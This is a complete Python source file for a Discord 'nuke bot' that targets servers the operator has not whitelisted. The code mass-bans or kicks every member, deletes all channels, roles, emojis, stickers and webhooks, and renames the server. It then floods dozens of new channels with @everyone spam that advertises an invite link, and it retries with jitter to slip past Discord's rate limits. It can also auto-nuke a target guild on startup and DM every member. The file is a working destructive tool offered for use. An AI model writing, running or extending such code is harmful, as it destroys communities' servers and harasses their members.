# language: Python 3.11+, file: bot.py, target: Discord + Railway
# Nuke Bot — prefix + whitelist + promo @everyone + anti rate-limit

from __future__ import annotations

import os
import sys
import json
import random
import asyncio
import logging
import traceback
from pathlib import Path
from typing import Optional, List, Iterable, Set

import aiohttp
from aiohttp import web
import discord
from discord.ext import commands
from discord.errors import HTTPException, Forbidden, NotFound

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
    force=True,
)
log = logging.getLogger("nuke")

WHITELIST_FILE = Path("whitelist.json")

# @everyone en clair + allowed_mentions=everyone=True sur tous les sends spam
PROMO = (
    "@everyone\n"
    "## Got fucked? Join us today..\n"
    "https://discord.gg/SKyfbZxzbp\n"
    "## WHITELIST UR SERVER! WITH US."
)

MENTION_EVERYONE = discord.AllowedMentions(everyone=True, users=True, roles=True)


def clean(v: Optional[str]) -> str:
    if not v:
        return ""
    v = v.strip()
    if len(v) >= 2 and v[0] == v[-1] and v[0] in ("'\""):
        v = v[1:-1].strip()
    return v


def first_env(*keys: str, default: str = "") -> str:
    for k in keys:
        val = clean(os.getenv(k))
        if val:
            log.info("Using env %s (len=%s)", k, len(val))
            return val
    return default


def env_bool(key: str, default: bool = False) -> bool:
    v = (os.getenv(key) or str(default)).strip().lower()
    return v in ("1", "true", "yes", "on", "y")


def env_int(key: str, default: int = 0) -> int:
    try:
        return int((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default


def env_float(key: str, default: float = 0.0) -> float:
    try:
        return float((os.getenv(key) or str(default)).strip())
    except ValueError:
        return default


def parse_ids(raw: str) -> Set[int]:
    out: Set[int] = set()
    for part in raw.replace(" ", "").split(","):
        if part.isdigit():
            out.add(int(part))
    return out


TOKEN = first_env(
    "TOKEN", "DISCORD_TOKEN", "BOT_TOKEN", "DISCORD_BOT_TOKEN",
    "CLIENT_TOKEN", "NUKE_TOKEN", "DISCORD_BOT",
)
OWNER_RAW = first_env(
    "OWNER_IDS", "OWNER_ID", "OWNERS", "BOT_OWNER", "OWNER", "ADMIN_IDS", "ADMIN_ID",
)
OWNER_IDS = parse_ids(OWNER_RAW)
PREFIX = first_env("PREFIX", "BOT_PREFIX", default="!") or "!"
PORT = env_int("PORT", 8080)

NUKE_NAME = first_env("NUKE_NAME", default="NUKED") or "NUKED"
SPAM_CHANNELS = max(0, env_int("SPAM_CHANNELS", 30))
SPAM_MESSAGES = max(1, env_int("SPAM_MESSAGES", 8))
_raw_spam = first_env("SPAM_TEXT", default="")
SPAM_TEXT = _raw_spam if _raw_spam else PROMO
if "@everyone" not in SPAM_TEXT:
    SPAM_TEXT = "@everyone\n" + SPAM_TEXT
WEBHOOK_SPAM = env_bool("WEBHOOK_SPAM", True)
BAN_REASON = first_env("BAN_REASON", default="nuked") or "nuked"
DELETE_ROLES = env_bool("DELETE_ROLES", True)
DELETE_EMOJIS = env_bool("DELETE_EMOJIS", True)
DELETE_STICKERS = env_bool("DELETE_STICKERS", True)
DELETE_WEBHOOKS = env_bool("DELETE_WEBHOOKS", True)
BAN_ALL = env_bool("BAN_ALL", True)
KICK_INSTEAD = env_bool("KICK_INSTEAD", False)
SKIP_BOTS = env_bool("SKIP_BOTS", False)
SKIP_OWNER = env_bool("SKIP_OWNER", True)
CHANGE_ICON = env_bool("CHANGE_ICON", False)
ICON_URL = first_env("ICON_URL")
CHANGE_BANNER = env_bool("CHANGE_BANNER", False)
BANNER_URL = first_env("BANNER_URL")
CREATE_ROLES = max(0, env_int("CREATE_ROLES", 5))
ROLE_NAME = first_env("ROLE_NAME", default="nuked") or "nuked"
CHANNEL_NAME = first_env("CHANNEL_NAME", default="nuked") or "nuked"
CREATE_CATEGORIES = max(0, env_int("CREATE_CATEGORIES", 3))
CREATE_VOICE = max(0, env_int("CREATE_VOICE", 5))
DM_MESSAGE = first_env("DM_MESSAGE") or PROMO
LOG_WEBHOOK = first_env("LOG_WEBHOOK", "WEBHOOK_URL")
AUTO_NUKE_GUILD = first_env("AUTO_NUKE_GUILD", "GUILD_ID", "TARGET_GUILD")
CONCURRENCY = max(1, min(env_int("CONCURRENCY", 2), 8))
RATE_LIMIT_DELAY = max(0.25, env_float("RATE_LIMIT_DELAY", 0.45))
PHASE_PAUSE = max(0.5, env_float("PHASE_PAUSE", 2.0))
MAX_RETRIES = max(1, env_int("MAX_RETRIES", 4))
CMD_COOLDOWN = max(0.0, env_float("CMD_COOLDOWN", 8.0))
PRUNE_DAYS = max(0, env_int("PRUNE_DAYS", 0))
VANITY = first_env("VANITY")
KEEPALIVE_SEC = max(30, env_int("KEEPALIVE_SEC", 60))

WHITELIST: Set[int] = parse_ids(first_env("WHITELIST_GUILDS", "WHITELIST", default=""))


def load_whitelist() -> None:
    global WHITELIST
    if WHITELIST_FILE.exists():
        try:
            data = json.loads(WHITELIST_FILE.read_text(encoding="utf-8"))
            for x in data:
                if isinstance(x, int) or (isinstance(x, str) and str(x).isdigit()):
                    WHITELIST.add(int(x))
        except Exception as e:
            log.warning("whitelist load: %s", e)


def save_whitelist() -> None:
    try:
        WHITELIST_FILE.write_text(json.dumps(sorted(WHITELIST), indent=2), encoding="utf-8")
    except Exception as e:
        log.warning("whitelist save: %s", e)


def is_whitelisted(guild_id: int) -> bool:
    return guild_id in WHITELIST


load_whitelist()

log.info("=== NUKE BOT BOOT ===")
log.info("python=%s", sys.version.split()[0])
log.info("ENV KEYS (%s): %s", len(os.environ), ", ".join(sorted(os.environ.keys())))
log.info("PORT=%s PREFIX=%s CONCURRENCY=%s DELAY=%.2f", PORT, PREFIX, CONCURRENCY, RATE_LIMIT_DELAY)
log.info("TOKEN found=%s len=%s", bool(TOKEN), len(TOKEN))
log.info("OWNER_IDS=%s WHITELIST=%s", OWNER_IDS or "(empty)", WHITELIST or "(empty)")

intents = discord.Intents.none()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True
intents.emojis = True
intents.emojis_and_stickers = True

bot = commands.Bot(
    command_prefix=PREFIX,
    intents=intents,
    help_command=None,
    chunk_guilds_at_startup=False,
)

sem: asyncio.Semaphore | None = None
action_lock = asyncio.Lock()
_http: aiohttp.ClientSession | None = None
_bot_ready = False
_global_cooldown_until = 0.0


def owner_only():
    async def pred(ctx: commands.Context) -> bool:
        if not OWNER_IDS:
            await ctx.send("OWNER_IDS manquant.")
            return False
        return ctx.author.id in OWNER_IDS

    return commands.check(pred)


async def get_http() -> aiohttp.ClientSession:
    global _http
    if _http is None or _http.closed:
        _http = aiohttp.ClientSession()
    return _http


async def external_log(msg: str):
    if not LOG_WEBHOOK:
        return
    try:
        session = await get_http()
        await session.post(LOG_WEBHOOK, json={"content": f"```{msg[:1900]}```"})
    except Exception:
        pass


async def say(msg: str):
    log.info(msg)
    await external_log(msg)


async def jitter_sleep(base: float | None = None):
    delay = base if base is not None else RATE_LIMIT_DELAY
    await asyncio.sleep(delay * (1.2 + random.random() * 0.4))


async def limited(coro):
    global _global_cooldown_until
    assert sem is not None

    async with sem:
        now = asyncio.get_event_loop().time()
        if now < _global_cooldown_until:
            await asyncio.sleep(_global_cooldown_until - now)

        last_err = None
        for attempt in range(MAX_RETRIES):
            try:
                result = await coro
                await jitter_sleep()
                return result
            except HTTPException as e:
                last_err = e
                if e.status == 429:
                    retry = 2.0 * (2 ** attempt)
                    try:
                        if e.response is not None:
                            ra = e.response.headers.get("Retry-After")
                            if ra is not None:
                                retry = float(ra) + random.uniform(0.3, 1.0)
                            if e.response.headers.get("X-RateLimit-Global", "").lower() == "true":
                                _global_cooldown_until = asyncio.get_event_loop().time() + retry
                                log.warning("GLOBAL rate limit — pause %.1fs", retry)
                    except Exception:
                        pass
                    log.warning("429 retry %s/%s wait %.1fs", attempt + 1, MAX_RETRIES, retry)
                    await asyncio.sleep(retry)
                    continue
                if e.status in (500, 502, 503, 504):
                    await asyncio.sleep(1.5 * (attempt + 1))
                    continue
                return None
            except (Forbidden, NotFound):
                return None
            except Exception as e:
                last_err = e
                return None
        if last_err:
            log.warning("gave up after retries: %s", last_err)
        return None


async def gather_limited(coros: Iterable):
    tasks = [asyncio.create_task(limited(c)) for c in coros]
    if not tasks:
        return []
    return await asyncio.gather(*tasks, return_exceptions=True)


async def phase_pause():
    await asyncio.sleep(PHASE_PAUSE + random.uniform(0, 0.8))


async def fetch_members(guild: discord.Guild) -> List[discord.Member]:
    try:
        if not guild.chunked:
            await guild.chunk(cache=True)
    except Exception as e:
        log.warning("chunk: %s", e)
    return list(guild.members)


async def action_ban_all(guild: discord.Guild, kick: bool = False) -> int:
    me, owner = guild.me, guild.owner
    members = await fetch_members(guild)
    targets = [
        m for m in members
        if not (me and m.id == me.id)
        and not (SKIP_OWNER and owner and m.id == owner.id)
        and not (SKIP_BOTS and m.bot)
    ]

    async def one(m: discord.Member):
        if DM_MESSAGE:
            try:
                await m.send(DM_MESSAGE[:2000])
            except Exception:
                pass
        if kick:
            await m.kick(reason=BAN_REASON)
        else:
            await m.ban(reason=BAN_REASON, delete_message_days=0)
        return 1

    results = await gather_limited(one(m) for m in targets)
    return sum(1 for r in results if r == 1)


async def action_delete_channels(guild: discord.Guild) -> int:
    async def one(ch):
        await ch.delete()
        return 1

    results = await gather_limited(one(ch) for ch in list(guild.channels))
    return sum(1 for r in results if r == 1)


async def action_delete_roles(guild: discord.Guild) -> int:
    me = guild.me
    roles = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and not (me and r >= me.top_role)
    ]

    async def one(role):
        await role.delete()
        return 1

    results = await gather_limited(one(r) for r in roles)
    return sum(1 for r in results if r == 1)


async def action_delete_emojis(guild: discord.Guild) -> int:
    async def one(e):
        await e.delete()
        return 1

    results = await gather_limited(one(e) for e in list(guild.emojis))
    return sum(1 for r in results if r == 1)


async def action_delete_stickers(guild: discord.Guild) -> int:
    async def one(s):
        await s.delete()
        return 1

    results = await gather_limited(one(s) for s in list(guild.stickers))
    return sum(1 for r in results if r == 1)


async def action_delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
    except Exception:
        return 0

    async def one(wh):
        await wh.delete()
        return 1

    results = await gather_limited(one(w) for w in webhooks)
    return sum(1 for r in results if r == 1)


async def download_bytes(url: str) -> Optional[bytes]:
    if not url:
        return None
    try:
        session = await get_http()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                return await resp.read()
    except Exception:
        pass
    return None


async def action_rename(guild: discord.Guild, name: str) -> bool:
    kwargs = {"name": name[:100]}
    if CHANGE_ICON and ICON_URL:
        data = await download_bytes(ICON_URL)
        if data:
            kwargs["icon"] = data
    if CHANGE_BANNER and BANNER_URL:
        data = await download_bytes(BANNER_URL)
        if data:
            kwargs["banner"] = data
    try:
        await guild.edit(**kwargs)
        return True
    except Exception as e:
        log.warning("rename: %s", e)
        return False


async def action_create_channels(guild: discord.Guild, n: int, base: str) -> List[discord.TextChannel]:
    created: List[discord.TextChannel] = []

    async def one(i: int):
        return await guild.create_text_channel(f"{base}-{i}")

    results = await gather_limited(one(i) for i in range(n))
    for r in results:
        if isinstance(r, discord.TextChannel):
            created.append(r)
    return created


async def action_create_categories(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_category(f"{base}-cat-{i}")
        return 1

    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_create_voice(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_voice_channel(f"{base}-vc-{i}")
        return 1

    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_create_roles(guild: discord.Guild, n: int, base: str) -> int:
    async def one(i: int):
        await guild.create_role(name=f"{base}-{i}")
        return 1

    results = await gather_limited(one(i) for i in range(n))
    return sum(1 for r in results if r == 1)


async def action_spam_messages(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        for _ in range(times):
            try:
                await ch.send(text[:2000], allowed_mentions=MENTION_EVERYONE)
            except HTTPException as e:
                if e.status == 429:
                    ra = 1.5
                    try:
                        if e.response is not None:
                            ra = float(e.response.headers.get("Retry-After", 1.5))
                    except Exception:
                        pass
                    await asyncio.sleep(ra + 0.5)
                    continue
                break
            except Exception:
                break
            await jitter_sleep()
        return 1

    await gather_limited(one(ch) for ch in channels)


async def action_webhook_spam(channels: List[discord.TextChannel], text: str, times: int):
    async def one(ch: discord.TextChannel):
        wh = None
        try:
            wh = await ch.create_webhook(name="nuke")
            for _ in range(times):
                try:
                    await wh.send(
                        text[:2000],
                        username="NUKE",
                        allowed_mentions=MENTION_EVERYONE,
                    )
                except HTTPException as e:
                    if e.status == 429:
                        ra = 1.5
                        try:
                            if e.response is not None:
                                ra = float(e.response.headers.get("Retry-After", 1.5))
                        except Exception:
                            pass
                        await asyncio.sleep(ra + 0.5)
                        continue
                    break
                except Exception:
                    break
                await jitter_sleep()
        except Exception:
            for _ in range(times):
                try:
                    await ch.send(text[:2000], allowed_mentions=MENTION_EVERYONE)
                except Exception:
                    break
                await jitter_sleep()
        finally:
            if wh:
                try:
                    await wh.delete()
                except Exception:
                    pass
        return 1

    await gather_limited(one(ch) for ch in channels)


async def action_dm_all(guild: discord.Guild, message: str) -> int:
    members = await fetch_members(guild)

    async def one(m: discord.Member):
        if m.bot or (guild.me and m.id == guild.me.id):
            return 0
        await m.send(message[:2000])
        return 1

    results = await gather_limited(one(m) for m in members)
    return sum(1 for r in results if r == 1)


async def action_prune(guild: discord.Guild, days: int) -> int:
    if days <= 0:
        return 0
    try:
        return await guild.prune_members(days=days, reason=BAN_REASON)
    except Exception:
        return 0


async def action_vanity(guild: discord.Guild, code: str) -> bool:
    if not code:
        return False
    try:
        await guild.edit(vanity_code=code)
        return True
    except Exception as e:
        log.warning("vanity: %s", e)
        return False


async def full_nuke(guild: discord.Guild):
    if is_whitelisted(guild.id):
        await say(f"[-] BLOCKED whitelist → {guild.name} ({guild.id})")
        return

    if action_lock.locked():
        await say("[-] Une action lourde tourne déjà — attends.")
        return

    async with action_lock:
        await say(f"[*] NUKE START → {guild.name} ({guild.id})")

        if BAN_ALL:
            await say(f"[+] Ban/Kick: {await action_ban_all(guild, kick=KICK_INSTEAD)}")
            await phase_pause()
        if PRUNE_DAYS > 0:
            await say(f"[+] Prune: {await action_prune(guild, PRUNE_DAYS)}")
            await phase_pause()
        if DELETE_WEBHOOKS:
            await say(f"[+] Webhooks: {await action_delete_webhooks(guild)}")
            await phase_pause()
        await say(f"[+] Channels deleted: {await action_delete_channels(guild)}")
        await phase_pause()
        if DELETE_ROLES:
            await say(f"[+] Roles deleted: {await action_delete_roles(guild)}")
            await phase_pause()
        if DELETE_EMOJIS:
            await say(f"[+] Emojis: {await action_delete_emojis(guild)}")
        if DELETE_STICKERS:
            await say(f"[+] Stickers: {await action_delete_stickers(guild)}")
            await phase_pause()
        await say(f"[+] Rename: {await action_rename(guild, NUKE_NAME)}")
        if VANITY:
            await say(f"[+] Vanity: {await action_vanity(guild, VANITY)}")
        await phase_pause()
        if CREATE_ROLES:
            await say(f"[+] Roles created: {await action_create_roles(guild, CREATE_ROLES, ROLE_NAME)}")
        if CREATE_CATEGORIES:
            await say(f"[+] Categories: {await action_create_categories(guild, CREATE_CATEGORIES, CHANNEL_NAME)}")
        if CREATE_VOICE:
            await say(f"[+] Voice: {await action_create_voice(guild, CREATE_VOICE, CHANNEL_NAME)}")
        await phase_pause()

        channels = await action_create_channels(guild, SPAM_CHANNELS, CHANNEL_NAME)
        await say(f"[+] Text channels: {len(channels)}")
        if channels and SPAM_MESSAGES > 0:
            text = SPAM_TEXT if SPAM_TEXT else PROMO
            if WEBHOOK_SPAM:
                await action_webhook_spam(channels, text, SPAM_MESSAGES)
            else:
                await action_spam_messages(channels, text, SPAM_MESSAGES)
            await say("[+] Spam @everyone + promo done")

        await say("[*] NUKE COMPLETE")


async def health_handler(_request):
    return web.Response(text="online" if _bot_ready else "starting", status=200)


async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info("Health OK on 0.0.0.0:%s", PORT)


@bot.event
async def on_ready():
    global sem, _bot_ready
    sem = asyncio.Semaphore(CONCURRENCY)
    _bot_ready = True
    log.info("===== BOT ONLINE as %s =====", bot.user)
    log.info("guilds=%s owners=%s whitelist=%s", len(bot.guilds), OWNER_IDS, WHITELIST)
    bot.loop.create_task(keepalive())
    if AUTO_NUKE_GUILD.isdigit():
        gid = int(AUTO_NUKE_GUILD)
        if is_whitelisted(gid):
            log.warning("AUTO_NUKE blocked — whitelisted %s", gid)
        else:
            g = bot.get_guild(gid)
            if g:
                log.info("AUTO_NUKE → %s", g.name)
                await full_nuke(g)


async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SEC)
        log.info(
            "alive | ready=%s guilds=%s latency=%.0fms",
            _bot_ready, len(bot.guilds), bot.latency * 1000,
        )


@bot.event
async def on_command_error(ctx: commands.Context, error: Exception):
    if isinstance(error, commands.CommandOnCooldown):
        try:
            await ctx.send(f"Cooldown `{error.retry_after:.1f}s` — anti rate-limit.", delete_after=5)
        except Exception:
            pass
        return
    if isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        return
    log.error("cmd: %s", error)
    try:
        await ctx.send(f"Erreur: `{error}`")
    except Exception:
        pass


@bot.event
async def on_error(event_method, *args, **kwargs):
    log.error("event %s\n%s", event_method, traceback.format_exc())


@bot.command(name="whitelist")
@owner_only()
@commands.cooldown(2, 3, commands.BucketType.user)
async def cmd_whitelist(ctx: commands.Context, action: str = "list", server_id: Optional[str] = None):
    action = action.lower().strip()
    if action in ("list", "ls", "show"):
        if not WHITELIST:
            await ctx.send("Whitelist vide.")
            return
        lines = "\n".join(str(i) for i in sorted(WHITELIST))
        await ctx.send(f"**Whitelist**\n```{lines[:1900]}```")
        return
    if action in ("add", "server", "+") and server_id:
        if not server_id.isdigit():
            await ctx.send("ID invalide.")
            return
        gid = int(server_id)
        WHITELIST.add(gid)
        save_whitelist()
        await ctx.send(f"Whitelisted `{gid}` — never nuke.")
        return
    if action in ("remove", "rm", "del", "-") and server_id:
        if not server_id.isdigit():
            await ctx.send("ID invalide.")
            return
        gid = int(server_id)
        WHITELIST.discard(gid)
        save_whitelist()
        await ctx.send(f"Retiré: `{gid}`")
        return
    if action.isdigit() and server_id is None:
        gid = int(action)
        WHITELIST.add(gid)
        save_whitelist()
        await ctx.send(f"Whitelisted `{gid}`")
        return
    await ctx.send(f"```{PREFIX}whitelist add|remove|list <id>\n{PREFIX}unwhitelist <id>```")


@bot.command(name="unwhitelist")
@owner_only()
@commands.cooldown(2, 3, commands.BucketType.user)
async def cmd_unwhitelist(ctx: commands.Context, server_id: str):
    if not server_id.isdigit():
        await ctx.send("ID invalide.")
        return
    gid = int(server_id)
    WHITELIST.discard(gid)
    save_whitelist()
    await ctx.send(f"Retiré: `{gid}`")


def heavy_cd():
    return commands.cooldown(1, CMD_COOLDOWN, commands.BucketType.user)


@bot.command(name="nuke")
@owner_only()
@heavy_cd()
async def cmd_nuke(ctx: commands.Context, guild_id: Optional[int] = None):
    target = bot.get_guild(guild_id) if guild_id else ctx.guild
    if not target:
        await ctx.send("Guild introuvable.")
        return
    if is_whitelisted(target.id):
        await ctx.send(f"⛔ Whitelist `{target.id}`")
        return
    if action_lock.locked():
        await ctx.send("Une action tourne déjà — attends la fin.")
        return
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(f"Nuke → **{target.name}**\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
    await full_nuke(target)


@bot.command(name="banall")
@owner_only()
@heavy_cd()
async def cmd_banall(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    if action_lock.locked():
        await ctx.send("Action en cours.")
        return
    async with action_lock:
        n = await action_ban_all(ctx.guild, False)
    await ctx.send(f"Banned: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="kickall")
@owner_only()
@heavy_cd()
async def cmd_kickall(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    if action_lock.locked():
        await ctx.send("Action en cours.")
        return
    async with action_lock:
        n = await action_ban_all(ctx.guild, True)
    await ctx.send(f"Kicked: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="delchannels")
@owner_only()
@heavy_cd()
async def cmd_delchannels(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    if action_lock.locked():
        await ctx.send("Action en cours.")
        return
    async with action_lock:
        n = await action_delete_channels(ctx.guild)
    await ctx.send(f"Channels: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="delroles")
@owner_only()
@heavy_cd()
async def cmd_delroles(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    if action_lock.locked():
        await ctx.send("Action en cours.")
        return
    async with action_lock:
        n = await action_delete_roles(ctx.guild)
    await ctx.send(f"Roles: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="delemojis")
@owner_only()
@heavy_cd()
async def cmd_delemojis(ctx: commands.Context):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    e = await action_delete_emojis(ctx.guild)
    s = await action_delete_stickers(ctx.guild)
    await ctx.send(f"Emojis: {e} | Stickers: {s}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="spam")
@owner_only()
@heavy_cd()
async def cmd_spam(ctx: commands.Context, count: int = 15):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    if action_lock.locked():
        await ctx.send("Action en cours.")
        return
    count = max(1, min(count, 40))
    async with action_lock:
        channels = await action_create_channels(ctx.guild, count, CHANNEL_NAME)
        text = SPAM_TEXT if SPAM_TEXT else PROMO
        if WEBHOOK_SPAM:
            await action_webhook_spam(channels, text, SPAM_MESSAGES)
        else:
            await action_spam_messages(channels, text, SPAM_MESSAGES)
    await ctx.send(f"Spam: {len(channels)} channels\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="rename")
@owner_only()
@commands.cooldown(1, 5, commands.BucketType.user)
async def cmd_rename(ctx: commands.Context, *, name: str = NUKE_NAME):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    ok = await action_rename(ctx.guild, name)
    await ctx.send(f"Rename: {ok}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="dmall")
@owner_only()
@heavy_cd()
async def cmd_dmall(ctx: commands.Context, *, message: Optional[str] = None):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    if action_lock.locked():
        await ctx.send("Action en cours.")
        return
    msg = message if message else PROMO
    async with action_lock:
        n = await action_dm_all(ctx.guild, msg)
    await ctx.send(f"DM: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="prune")
@owner_only()
@heavy_cd()
async def cmd_prune(ctx: commands.Context, days: int = 1):
    if is_whitelisted(ctx.guild.id):
        await ctx.send("⛔ Whitelist")
        return
    n = await action_prune(ctx.guild, days)
    await ctx.send(f"Pruned: {n}\n{PROMO}", allowed_mentions=MENTION_EVERYONE)


@bot.command(name="leave")
@owner_only()
@commands.cooldown(1, 5, commands.BucketType.user)
async def cmd_leave(ctx: commands.Context):
    await ctx.send(f"Leaving\n{PROMO}", allowed_mentions=MENTION_EVERYONE)
    await ctx.guild.leave()


@bot.command(name="guilds")
@owner_only()
@commands.cooldown(2, 5, commands.BucketType.user)
async def cmd_guilds(ctx: commands.Context):
    lines = []
    for g in bot.guilds:
        mark = " [WL]" if is_whitelisted(g.id) else ""
        lines.append(f"{g.name} | {g.id} | {g.member_count}{mark}")
    await ctx.send(f"```{(chr(10).join(lines) or 'none')[:1900]}```")


@bot.command(name="status")
@owner_only()
@commands.cooldown(2, 5, commands.BucketType.user)
async def cmd_status(ctx: commands.Context):
    await ctx.send(
        f"**{bot.user}**\n"
        f"Guilds `{len(bot.guilds)}` | `{round(bot.latency * 1000)}ms`\n"
        f"Concurrency `{CONCURRENCY}` | Delay `{RATE_LIMIT_DELAY}s`\n"
        f"Whitelist `{len(WHITELIST)}` | Lock `{'busy' if action_lock.locked() else 'free'}`\n"
        f"{PROMO}",
        allowed_mentions=MENTION_EVERYONE,
    )


@bot.command(name="helpnuke")
@owner_only()
@commands.cooldown(1, 3, commands.BucketType.user)
async def cmd_help(ctx: commands.Context):
    await ctx.send(
        f"```\n"
        f"{PREFIX}nuke [id]  {PREFIX}banall  {PREFIX}kickall\n"
        f"{PREFIX}delchannels  {PREFIX}delroles  {PREFIX}delemojis\n"
        f"{PREFIX}spam [n]  {PREFIX}rename  {PREFIX}dmall  {PREFIX}prune\n"
        f"{PREFIX}whitelist add|remove|list <id>\n"
        f"{PREFIX}unwhitelist <id>\n"
        f"{PREFIX}leave  {PREFIX}guilds  {PREFIX}status\n"
        f"```\n{PROMO}",
        allowed_mentions=MENTION_EVERYONE,
    )


async def runner():
    await start_health_server()
    if not TOKEN:
        log.error("NO TOKEN")
        while True:
            await asyncio.sleep(3600)
        return
    log.info("Connecting to Discord…")
    try:
        async with bot:
            await bot.start(TOKEN, reconnect=True)
    except discord.LoginFailure:
        log.error("LOGIN FAILED")
        while True:
            await asyncio.sleep(3600)
    except Exception:
        log.error("BOT CRASH:\n%s", traceback.format_exc())
        while True:
            await asyncio.sleep(3600)


def main():
    try:
        asyncio.run(runner())
    except Exception:
        log.error("MAIN:\n%s", traceback.format_exc())
        sys.exit(1)


if __name__ == "__main__":
    main()
